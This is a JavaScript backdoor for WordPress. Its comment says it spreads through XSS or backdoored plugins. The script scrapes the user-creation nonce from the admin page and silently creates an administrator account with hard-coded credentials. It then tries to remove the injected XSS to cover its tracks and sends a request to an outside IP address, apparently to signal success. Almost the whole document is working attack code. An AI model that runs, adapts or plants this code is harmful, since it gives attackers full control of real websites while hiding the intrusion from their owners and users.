//JavaScript backdoor that creates admin user account on Wordpress. It can spreads through XSS or backdoored plugins.

var $ = jQuery.noConflict();
     $.ajax({
        "url": newuser_url,
        "success" : function(html){
            /*console.log("Getting Nonce");*/
            var re = /name="_wpnonce_create-user"([ ]+)value="([^"]+)"/g;
            if(html.indexOf("_wpnonce_create-user") !== -1) {
            var m = re.exec(html);
            if (m[2].match(/([a-z0-9]{10})/)) {
                var nonce = m[2];
               
                $.ajax({
                    "url": newuser_url,
                    "method" : "POST",
                    "data" :
                    {
                        "action":"createuser",
                        "_wpnonce_create-user": nonce,
                        "_wp_http_referer" : "/wp-admin/user-new.php",
                        "user_login": "simple001",
                        "email" : "simple@simplesite.com",
                        "first_name" : "simple",
                        "last_name" : "simple",
                        "url" : "http://simple.com/",
                        "pass1" : "passforme1",
                        "pass1-text" : "passforme1",
                        "pass2" : "passforme1",
                        "send_user_notification" : 0,
                        "role":"administrator",
                        "createuser" : "Add+New+User"
                    },
                    "success" : function(html){
                        //console.log("New User created");
                        //Removeing the XSS from the site, callback hell
                        $.ajax({
                            "url": ajax_url,
                            "method" : "POST",
                            "data" :
                             {
                                "action":"fake",
                                "permalink_structure": 1
                             },
                            "success": function(){
                                //Resed dome, reload the page
                                httpGet("http://146.185.182.176/g/a.php");
                                //window.location = window.location + '&reload=1';
                            }
                        });
 
                    }
                });
            }
           
        }
 
        }
    });"
 	